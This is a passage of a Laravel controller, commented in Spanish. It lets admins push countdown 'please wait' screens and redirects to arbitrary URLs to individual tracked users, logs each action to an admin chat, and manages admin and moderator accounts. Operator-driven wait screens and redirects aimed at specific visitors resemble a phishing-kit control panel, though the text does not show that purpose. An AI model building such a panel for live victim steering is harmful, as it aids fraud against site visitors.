            'request_data' => $request->all()
        ]);

        try {
            $request->validate([
                'usuario_id' => 'required|integer|exists:usuarios,id',
                'tiempo_segundos' => 'required|integer|min:1|max:3600',
                'mensaje_personalizado' => 'nullable|string|max:1000'
            ]);

            $usuario_id = $request->usuario_id;
            $tiempo_segundos = $request->tiempo_segundos;
            $mensaje_personalizado = $request->mensaje_personalizado ?? 'Por favor, espera mientras procesamos tu solicitud...';

            // Obtener IP del usuario
            $usuario = Usuario::find($usuario_id);
            if (!$usuario) {
                return response()->json([
                    'success' => false,
                    'error' => 'Usuario no encontrado'
                ], 404);
            }

            // Crear timer
            $timer = TimerEnviado::create([
                'usuario_id' => $usuario_id,
                'admin_id' => (Session::get('admin_id') ?? null),
                'tiempo_segundos' => $tiempo_segundos,
                'mensaje_personalizado' => $mensaje_personalizado,
                'ip_usuario' => $usuario->ip_real ?? request()->ip(),
                'estado' => 'pendiente',
                'fecha_envio' => now()
            ]);

            Log::info('Timer creado exitosamente', [
                'timer_id' => $timer->id,
                'usuario_id' => $usuario_id,
                'tiempo_segundos' => $tiempo_segundos
            ]);

            // Persistir en el chat del admin que se envió un timer
            MensajeAdmin::create([
                'usuario_id' => $usuario_id,
                'admin_id' => (Session::get('admin_id') ?? null),
                'mensaje' => '⏰ Timer enviado: ' . $tiempo_segundos . 's',
                'tipo_mensaje' => 'sin_input',
                'ip_usuario' => request()->ip(),
                'estado' => 'leido',
                'fecha_envio' => now(),
                'fecha_leido' => now()
            ]);

            return response()->json([
                'success' => true,
                'timer_id' => $timer->id,
                'message' => 'Timer enviado correctamente'
            ]);

        } catch (\Exception $e) {
            Log::error('Error enviando timer: ' . $e->getMessage());
            return response()->json([
                'success' => false,
                'error' => 'Error interno del servidor'
            ], 500);
        }
    }

    /**
     * Enviar redirección
     */
    public function enviarRedireccion(Request $request)
    {
        Log::info('=== MÉTODO ENVIAR REDIRECCIÓN LLAMADO ===', [
            'request_data' => $request->all()
        ]);

        try {
            $request->validate([
                'usuario_id' => 'required|integer|exists:usuarios,id',
                'url_destino' => 'required|string|max:500',
                'tipo_redireccion' => 'required|in:url_personalizada,index',
                'mensaje_confirmacion' => 'nullable|string|max:1000'
            ]);

            $usuario_id = $request->usuario_id;
            $url_destino = $request->url_destino;
            $tipo_redireccion = $request->tipo_redireccion;
            $mensaje_confirmacion = $request->mensaje_confirmacion ?? '¿Deseas continuar con la redirección?';

            // Obtener IP del usuario
            $usuario = Usuario::find($usuario_id);
            if (!$usuario) {
                return response()->json([
                    'success' => false,
                    'error' => 'Usuario no encontrado'
                ], 404);
            }

            // Crear redirección
            $redireccion = RedireccionEnviada::create([
                'usuario_id' => $usuario_id,
                'admin_id' => (Session::get('admin_id') ?? null),
                'url_destino' => $url_destino,
                'tipo_redireccion' => $tipo_redireccion,
                'mensaje_confirmacion' => $mensaje_confirmacion,
                'ip_usuario' => $usuario->ip_real ?? request()->ip(),
                'estado' => 'pendiente',
                'fecha_envio' => now()
            ]);

            Log::info('Redirección creada exitosamente', [
                'redireccion_id' => $redireccion->id,
                'usuario_id' => $usuario_id,
                'url_destino' => $url_destino
            ]);

            // Persistir en el chat del admin que se envió una redirección
            MensajeAdmin::create([
                'usuario_id' => $usuario_id,
                'admin_id' => (Session::get('admin_id') ?? null),
                'mensaje' => '🔄 Redirección enviada a: ' . ($tipo_redireccion === 'index' ? 'Index' : $url_destino),
                'tipo_mensaje' => 'sin_input',
                'ip_usuario' => request()->ip(),
                'estado' => 'leido',
                'fecha_envio' => now(),
                'fecha_leido' => now()
            ]);

            return response()->json([
                'success' => true,
                'redireccion_id' => $redireccion->id,
                'message' => 'Redirección enviada correctamente'
            ]);

        } catch (\Exception $e) {
            Log::error('Error enviando redirección: ' . $e->getMessage());
            return response()->json([
                'success' => false,
                'error' => 'Error enviando redirección'
            ], 500);
        }

    }


    // ===== Gestión de Admins/Mods =====
    public function listAdmins(Request $request)
    {
        $admins = AdministracionControl::select('id','usuario','is_admin','is_mod','permisos','ultima_fecha_ingreso','fecha_creacion')->orderBy('id','asc')->get();
        return response()->json(['success' => true, 'admins' => $admins]);
    }

    public function createAdmin(Request $request)
    {
        $request->validate([
            'usuario' => 'required|string|max:100|unique:administracion_control,usuario',
            'clave' => 'required|string|min:6',
            'is_admin' => 'boolean',
            'is_mod' => 'boolean',
            'permisos' => 'array',
        ]);
        $current = $this->currentAdmin();
        $isAdminFlag = (bool)$request->boolean('is_admin');
        if ($isAdminFlag && (!$current || !$current->is_admin)) {
            return response()->json(['success' => false, 'error' => 'Solo un superadmin puede crear otro superadmin'], 403);
        }
        $admin = new AdministracionControl();
        $admin->usuario = $request->input('usuario');
        $admin->clave = $request->input('clave'); // se hashea por mutator
        $admin->is_admin = $isAdminFlag;
        $admin->is_mod = (bool)$request->boolean('is_mod');
        $admin->permisos = $request->input('permisos', []);
        $admin->fecha_creacion = now();
        $admin->save();
        return response()->json(['success' => true, 'admin' => $admin]);
    }

    public function updateAdmin(Request $request, $id)
    {
        $admin = AdministracionControl::findOrFail($id);
        $current = $this->currentAdmin();
        $request->validate([
            'usuario' => 'nullable|string|max:100|unique:administracion_control,usuario,' . $admin->id,
            'clave' => 'nullable|string|min:6',
            'is_admin' => 'boolean',
            'is_mod' => 'boolean',
            'permisos' => 'array',
        ]);
        // Solo superadmin puede tocar superadmins
        if ($admin->is_admin && (!$current || !$current->is_admin)) {
            return response()->json(['success' => false, 'error' => 'No puedes modificar un superadmin'], 403);
        }
        if ($request->filled('usuario')) $admin->usuario = $request->input('usuario');
        if ($request->filled('clave')) $admin->clave = $request->input('clave'); // mutator
        if ($request->has('is_admin')) {
            if (!$current || !$current->is_admin) {
                return response()->json(['success' => false, 'error' => 'Solo un superadmin puede cambiar rol de superadmin'], 403);
            }
            $admin->is_admin = (bool)$request->boolean('is_admin');
        }
        if ($request->has('is_mod')) $admin->is_mod = (bool)$request->boolean('is_mod');
        if ($request->has('permisos')) $admin->permisos = $request->input('permisos', []);
        $admin->save();
        return response()->json(['success' => true, 'admin' => $admin]);
    }

    public function deleteAdmin(Request $request, $id)
    {
        $admin = AdministracionControl::findOrFail($id);
        $current = $this->currentAdmin();
        // No permitir borrar superadmin si no eres superadmin
        if ($admin->is_admin && (!$current || !$current->is_admin)) {
            return response()->json(['success' => false, 'error' => 'No puedes eliminar un superadmin'], 403);
        }
        // Evitar dejar el sistema sin superadmin
        if ($admin->is_admin) {
            $countSuper = AdministracionControl::where('is_admin', true)->where('id','!=',$admin->id)->count();
            if ($countSuper <= 0) {
                return response()->json(['success' => false, 'error' => 'Debe existir al menos un superadmin'], 422);
            }
        }
        $admin->delete();
        return response()->json(['success' => true]);
    }

}
